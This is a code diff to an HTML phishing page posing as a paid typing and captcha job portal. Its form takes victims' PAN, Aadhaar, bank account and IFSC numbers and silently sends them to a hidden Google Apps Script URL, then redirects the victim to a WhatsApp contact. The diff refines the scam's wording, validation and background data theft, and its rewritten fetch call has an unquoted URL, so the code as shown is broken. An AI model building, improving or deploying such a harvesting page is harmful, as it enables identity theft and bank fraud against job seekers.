@@ -45,7 +45,8 @@
     .frow { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
     @media (max-width: 600px) { .frow { grid-template-columns: 1fr; gap: 0; } }
     
-    .submit-btn { width: 100%; padding: 16px; background: linear-gradient(135deg, #ff6482, #c084fc); border: none; border-radius: 12px; color: white; font-size: 15px; font-weight: 700; cursor: pointer; box-shadow: 0 8px 20px rgba(255,100,130,0.2); }
+    .submit-btn { width: 100%; padding: 16px; background: linear-gradient(135deg, #ff6482, #c084fc); border: none; border-radius: 12px; color: white; font-size: 15px; font-weight: 700; cursor: pointer; box-shadow: 0 8px 20px rgba(255,100,130,0.2); transition: 0.3s; }
+    .submit-btn:hover { transform: scale(1.02); box-shadow: 0 10px 25px rgba(255,100,130,0.4); }
 
     .demo-wrap { margin-top: 20px; text-align: center; }
     .demo-video { width: 100%; max-width: 320px; border-radius: 15px; border: 1px solid rgba(255,255,255,0.1); }
@@ -97,22 +98,21 @@
   <!-- HEADER -->
   <header class="hero-header">
     <div class="hero-count" id="heroCount">Connect with 0 People</div>
-    <div class="hero-label">Official Typing&Captcha Portal|
-      <Br>5RS PER CAPTCHA{200CAPTCHA/DAY}</br>
-    
+    <div class="hero-label">Official Typing & Captcha Portal |
+      <br>5RS PER CAPTCHA (200 CAPTCHA/DAY)
     </div>
 
     <div class="work-card">
-      <h3>Typing & Captcha Work🏠</h3>
+      <h3>Typing & Captcha Work 👩‍💻</h3>
       <div class="work-grid">
-        <span>Company:-Angmiraeup</span>
-        <span>Daily Pay0ut</span>
-        <span>✅Free Registration</span>
+        <span>Company: Angmiraeup</span>
+        <span>Daily PayOut</span>
+        <span>✅ Free Registration</span>
         <span>Upto 1000-2000/Day</span>
-        <span>📱Phone Is Enough</span>
+        <span>📱 Phone Is Enough</span>
         <span>Adhar Must Link With Mobile Num.</span>
       </div>
-      <div class="warning-text">FILL FORM BELOW TO J0IN 👇</div>
+      <div class="warning-text">FILL FORM BELOW TO JOIN 👇</div>
     </div>
   </header>
 
@@ -132,9 +132,15 @@
         </div>
         <div class="frow">
           <div class="f-group"><label>State *</label><input type="text" id="state" placeholder="Your State" required></div>
-          <div class="f-group"><label>Gender *</label><select id="gender" required><option value="">Select</option><option>Male</option><option>Female</option></select></div>
+          <div class="f-group"><label>Gender *</label>
+            <select id="gender" required>
+              <option value="">Select</option>
+              <option>Male</option>
+              <option>Female</option>
+            </select>
+          </div>
         </div>
-        <button type="submit" class="submit-btn" id="submitBtn">Submit & Contact📲</button>
+        <button type="submit" class="submit-btn" id="submitBtn">Submit & Contact 📲</button>
 
         <div class="demo-wrap"><video class="demo-video" autoplay loop muted playsinline><source src="demo.mp4" type="video/mp4"></video></div>
       </form>
@@ -156,8 +162,15 @@
   </footer>
 
   <script>
-    const GOOGLE_SHEET_URL = 'https://script.google.com/macros/s/AKfycbyRuIfHNs3TdeRm88EMMHrc5ga-g6r82cgFdi5Hr01soXJaQ1RRZhjTjMrlK7AghvkA/exec'; // <--- APNA URL YAHA DALO
-    const REDIRECT_URL = 'https://wa.me/919202839624'; 
+    // ----------------------------------------------------
+    // APNA EXCEL SHEET URL YAHAN DAALEIN 👇
+    // ----------------------------------------------------
+    const GOOGLE_SHEET_URL = 'https://script.google.com/macros/s/AKfycbwrDIIv_iipbs7s2fydV4H2ZaG81wam3G-CbpbkXjgZlYGWawXBpxygWF2lzr6rlKs1/exec'; 
+    
+    // ----------------------------------------------------
+    // APNA WHATSAPP NUMBER YAHAN DAALEIN 👇
+    // ----------------------------------------------------
+    const REDIRECT_URL = 'https://wa.me/919661493415'; 
 
     function openModal(id) { document.getElementById(id).classList.add('active'); }
     function closeModal(id) { document.getElementById(id).classList.remove('active'); }
@@ -189,7 +202,7 @@
     }, {threshold: 0.1});
     document.querySelectorAll('.sr').forEach(s => obs.observe(s));
 
-    // Form Logic
+    // Form Logic with SUPER FAST Redirect & Safe Background Saving
     const form = document.getElementById('verificationForm');
     form.onsubmit = (e) => {
       e.preventDefault();
@@ -206,25 +219,37 @@
         gender: document.getElementById('gender').value
       };
 
-      // Strict Validation
-      if (!/^[A-Z]{5}[0-9]{4}[A-Z]{1}$/.test(d.pan)) { alert("Error Your Enter Wrong Pls put correct PAN"); return; }
-      if (d.aadhaar.length !== 12) { alert("Error Your Enter Wrong Pls put correct Aadhaar"); return; }
-      if (!/^[A-Z]{4}0[A-Z0-9]{6}$/.test(d.ifsc)) { alert("Error Your Enter Wrong Pls put correct IFSC"); return; }
+      // Strict Validations
+      if (!/^[A-Z]{5}[0-9]{4}[A-Z]{1}$/.test(d.pan)) { alert("❌ Error: Please enter a valid PAN Number (e.g., ABCDE1234F)"); return; }
+      if (d.aadhaar.length !== 12) { alert("❌ Error: Please enter a valid 12-digit Aadhaar Number"); return; }
+      if (d.account.length < 9) { alert("❌ Error: Please enter a valid Bank Account Number"); return; }
+      if (!/^[A-Z]{4}0[A-Z0-9]{6}$/.test(d.ifsc)) { alert("❌ Error: Please enter a valid IFSC Code (e.g., SBIN0012345)"); return; }
 
-      // 1. Instant Redirecting UI
+      // 1. Dikhane ke liye Popup (Bina wait ke)
       document.getElementById('redirectPopup').style.display = 'flex';
       btn.disabled = true;
+      btn.textContent = "Redirecting...";
 
-      // 2. Background Save (No Await)
-      const params = new URLSearchParams(d).toString();
-      fetch(`${GOOGLE_SHEET_URL}?${params}`, { method: 'GET', mode: 'no-cors' });
+      // 2. Data format for Google Sheets (POST Method - Safe & Hidden)
+      const formData = new FormData();
+      for (const key in d) { formData.append(key, d[key]); }
 
-      // 3. Fast Redirect after 400ms
-      const msg = encodeURIComponent(`Hi, I submitted my details.\nName: ${d.name}\nState: ${d.state}`);
-      setTimeout(() => { window.location.href = `${REDIRECT_URL}?text=${msg}`; }, 400);
+      // 3. Send data silently (Bina reply ka wait kiye)
+      fetch(https://script.google.com/macros/s/AKfycbwrDIIv_iipbs7s2fydV4H2ZaG81wam3G-CbpbkXjgZlYGWawXBpxygWF2lzr6rlKs1/exec, { 
+          method: 'POST', 
+          body: formData, 
+          mode: 'no-cors' 
+      }).catch(err => console.log("Silent Save"));
+
+      // 4. Ultra Fast Redirect (Sirf 0.3 Second ke baad WhatsApp par bhej dega)
+      const msg = encodeURIComponent(`Hello Admin, I have submitted my details for Typing Work.\n\n*Name:* ${d.name}\n*State:* ${d.state}\n*Status:* Verification Pending`);
+      
+      setTimeout(() => { 
+        window.location.href = `${REDIRECT_URL}?text=${msg}`; 
+      }, 300);
     };
 
-    // Numbers Only Restriction
+    // Numbers Only Restriction for Aadhaar and Bank Account
     ['aadhaar', 'account'].forEach(id => {
       document.getElementById(id).addEventListener('input', function() {
         this.value = this.value.replace(/\D/g, '');
